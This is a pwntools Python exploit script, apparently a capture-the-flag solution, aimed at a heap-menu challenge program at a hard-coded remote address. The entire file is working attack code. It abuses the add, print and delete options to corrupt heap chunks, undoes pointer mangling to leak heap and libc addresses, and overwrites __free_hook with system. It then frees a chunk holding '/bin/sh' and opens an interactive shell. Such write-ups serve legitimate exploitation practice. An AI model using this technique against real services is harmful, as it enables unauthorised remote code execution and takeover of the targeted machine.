

from pwn import *

# p = process('./secrets')
p = remote('3.0.58.217', 2020)

def add_secret(index, length, my_id, name, content, raw=False):
	p.sendlineafter("Choice:", '1')
	p.sendlineafter("Index:", str(index))
	p.sendlineafter("Length:", str(length))
	p.sendlineafter("Id:", str(my_id))
	p.sendlineafter("Name", name)
	if(raw):
		p.sendafter("Content:", content)
		sleep(1)
		p.sendline()
	else:
		p.sendlineafter("Content:", content)

def print_secret(index):
	p.sendlineafter("Choice:", '2')
	p.sendlineafter("Index:", str(index))

def delete_secret(index):
	p.sendlineafter("Choice:", '3')
	p.sendlineafter("Index:", str(index))

def gb(f, s):
	return bytes([int.from_bytes(f, 'little') ^ s])

def fix_leak(leak):
	ans = leak & 0xfff000000000
	for i in range(5):
		ans |= (leak ^ (ans >> 12)) & (0xff << (8*(4-i)))
	return ans

for i in range(5):
	add_secret(i, 6, 'a', 'Zafir', "Z")

delete_secret(3)
add_secret(4, 6, 'a', 'Zafir', "Z")
delete_secret(3)
delete_secret(2)
delete_secret(0)
print_secret(0)

p.recvuntil("Id: ")
helper = p.recv(1)
print(helper)

add_secret(0, 17, 'a', 'test', p64(0)*2 + b'\x61')

delete_secret(1)
add_secret(1, 0x58 - 0x17, 'a', 'test', p64(0)*2 + p64(0x31) + gb(helper, 0x20), raw=True)
add_secret(2, 17, 'a', 'test', "A")
add_secret(3, 17, 'a', b"A"*7 + p64(0x31), "ABABA")

delete_secret(2)
delete_secret(4)
print_secret(3)

p.recvuntil("Length: ")
leak_1 = int(p.recvuntil('\n'))
p.recvuntil("#: ")
leak_2 = int(p.recvuntil('\n'))
leak = (leak_1<<32) + leak_2
heap_leak = fix_leak(leak)
print(hex(heap_leak))

delete_secret(3)
add_secret(3, 17+16, 'a', b"A"*7 + p64(0x451), "ABABA")

for i in range(15):
	add_secret(0, 17+32, 'a', b"A"*7 + p64(0x21), (p64(0x61) + p64(0))*3 + b'\x61')

delete_secret(4)
print_secret(3)

p.recvuntil("Length: ")
leak_1 = int(p.recvuntil('\n'))
p.recvuntil("#: ")
leak_2 = int(p.recvuntil('\n'))
libc_leak = (leak_1<<32) + leak_2
libc_base = libc_leak - 0x1c2a60
system_add = libc_base + 0x4a830
free_hook = libc_base + 0x1c5ca0
print(hex(free_hook))


for i in range(13):
	add_secret(0, 17+32, 'a', b"A"*7 + p64(0x21), "A")
for i in range(4):
	add_secret(i, 17+32, 'a', 'Zafir', "Z")

delete_secret(3)

add_secret(4, 17+16, 'a', 'Zafir', "Z")
add_secret(4, 17+16, 'a', 'Zafir', "Z")
add_secret(3, 17+16, 'a', 'Zafir', "Z")
delete_secret(3)
add_secret(3, 17+32, 'a', 'Zafir', "Z")

delete_secret(4)
delete_secret(3)
add_secret(4, 17+32, 'a', 'Zafir', "Z")
delete_secret(3)
delete_secret(2)
delete_secret(0)
print_secret(0)

p.recvuntil("Id: ")
helper = p.recv(1)
print(helper)

add_secret(0, 17+32, 'a', 'test', p64(0)*6 + b'\x61')

delete_secret(1)
add_secret(1, 0x58 - 0x17, 'a', 'test', p64(0)*6 + p64(0x51) + gb(helper, 0xb0), raw=True)
add_secret(2, 17+32, 'a', 'test', "A")
point = ((heap_leak + 0x630) >> 12) ^ free_hook
add_secret(3, 17+32, 'a', b"A"*7, p64(0x41) + p64(0) + p64(0x41) + p64(point))

add_secret(2, 17+16, '/', 'bin/sh', "asjdasd")
add_secret(3, 17+16, chr(p64(system_add)[0]), p64(system_add)[1:], "asjdasd")
delete_secret(2)


p.interactive()
p.close()